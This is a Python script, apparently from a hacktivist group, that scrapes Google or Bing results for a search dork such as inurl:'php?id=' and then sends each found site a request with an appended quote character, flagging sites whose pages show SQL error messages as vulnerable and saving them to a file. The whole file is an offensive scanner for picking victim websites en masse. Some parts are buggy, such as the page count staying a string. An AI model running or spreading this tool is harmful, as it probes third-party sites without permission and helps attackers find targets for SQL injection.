import requests
import re
import os
import sys
import time

sqlerrors =["You have an error in your SQL syntax",
"supplied argument is not a valid MySQL result resource", 
"check the manual that corresponds to your MySQL", 
"mysql_fetch_array()", 
"supplied argument is not a valid MySQL", 
"function fetch_row()", 
"Microsoft OLE DB Provider for ODBC Drivers error"]
User_Agent = { 'User-agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36' }

def saiki():
   now = time.strftime("[ %H:%M:%S ]", time.localtime(time.time()))
   return now


def dorking(dork,start, tipe):
    if tipe == "google":
        url = "https://google.co.id/search"
        data = { 'q' : dork, 'start' : start}
    else:
        url = "https://bing.com/search"
        data = { 'q' : dork, 'first' : start }

    try:
       s = requests.Session()
       r = s.get(url, params=data, headers=User_Agent)
       if 'Our systems have detected unusual traffic from your computer network' in r.text:
           print("\033[41m[CRITICAL]" + saiki() + "Captcha Detect !!\033[00m")
           con = input("Are you want continue? [Y/n] > ")
           if con.lower() == "n":
               sys.exit()               
       return r.text
  
    except requests.exceptions.RequestException as e:
       print("\033[41m[CRITICAL]"+saiki()+"Request timed out \033[00m")
          
    
def bing(dork):
    first = 1
    text = ""
    for i in range(page):
        txt = dorking(dork, str(first), "bing")
        try:           
            text += txt
        except TypeError:
            print("\033[32m[INFO]"+saiki()+"Retrying to send process again..\033[00m")
            test(dork, method)    
        first += 10        
    site = re.findall( '<h2><a href="(.+?)"', text )
    return set(site)
     
def google(dork):
    start = 0
    text = ""
    for i in range(page):
        txt = dorking(dork, str(start), "google")
        try:                           
            text += txt
        except TypeError:
            print("\033[32m[INFO]"+saiki()+"Retrying to send process again..\033[00m")
            test(dork, method)    
        start += 10        
    site = re.findall( '<h3 class="r"><a href="(.+?)"', text )
    return set(site)
               

def test(dork, tipe):
    if tipe == "google":
        site = google(dork)
    else:
        site = bing(dork)    
    panjang = len(site)
    vuln = []
    print("\033[32m[INFO]"+saiki()+"URL Finded: %s sites\033[00m" % panjang)
    print("-----------------------------------------\n ")
    for x in site:
        print(x)
    print()
    print("\033[32m[INFO]"+saiki()+"Checking vulnerability ..")
    print("\033[32m[INFO]"+saiki()+"Please wait ..\033[00m")
    print()  
    for i in site:
        try: 
            r1 = requests.get(i, headers=User_Agent)
            r = requests.get(i + '%27', headers=User_Agent)
            if r.status_code == 200:
                for j in sqlerrors:
                    if j in r.text or r1.text != r.text or "include(" in r.text.lower():
                        vuln.append(i)                                       
        except requests.exceptions.RequestException as e:
             print("\033[41m[CRITICAL]"+saiki()+"Error while testing: " + i+"\033[00m")
             continue
    svuln = set(vuln)
    for x in svuln:
        print("vuln: " + x)    
    pjg = len(svuln)
    print()
    print("\033[32m[INFO]"+saiki()+"Vuln site founded: %s" % pjg)                 
    save = input("\033[33m[?] Are you want to save result [y/N] > ")
    if save.lower() == "y":
        f = open("result.txt", "a+")
        for z in svuln:
            f.write(z+"\n")
        f.close()         

def banner():
    print("""   ______________ _____  ____ ___  ___ 
  / ___/ ___/ __ `/ __ \/ __ `__ \/ _ \  
 (__  ) /__/ /_/ / / / / / / / / /  __/
/____/\___/\__,_/_/ /_/_/ /_/ /_/\___/ 
                         LFI & SQLi dork scanner

Made with love by Dipkill (Clown Hacktivism Team)
visit: https://clownhacktivismteam.org
       https://github.com/Dipkill""")
    print()
def help():
    banner()
    print("""usage: ./{0} -d your_dork [-g --google] [-b --bing] [--proxy your proxy]
example: ./{0} -d inurl:'php?id=' -g
  
-h --h --help \t Show help message & exit
-d Dork \t Dork ex. "inurl:'php?id='"
-g --google \t use google dorker(default)
-b --bing \t use bing dorker(choose 1)
--page \t\t finished parameter start(finished page) in search engine (default 5)\n""".format(sys.argv[0]))
    exit()    


method = "google"
page = 5    
if "-d" in sys.argv:
    dork = sys.argv[sys.argv.index("-d")+1]
else:
    help()
     
if "-g" in sys.argv or "--google" in sys.argv:
    pass
if "-b" in sys.argv or "--bing" in sys.argv:
    method = "bing"
if "--page" in sys.argv:
    page = sys.argv[sys.argv.index("--page")+1]
elif "-h" in sys.argv or "--help" in sys.argv or "--h" in sys.argv:
        help()   

banner()
print("\033[32m[INFO]"+saiki()+"Searching site..\033[00m")
test(dork, method)                
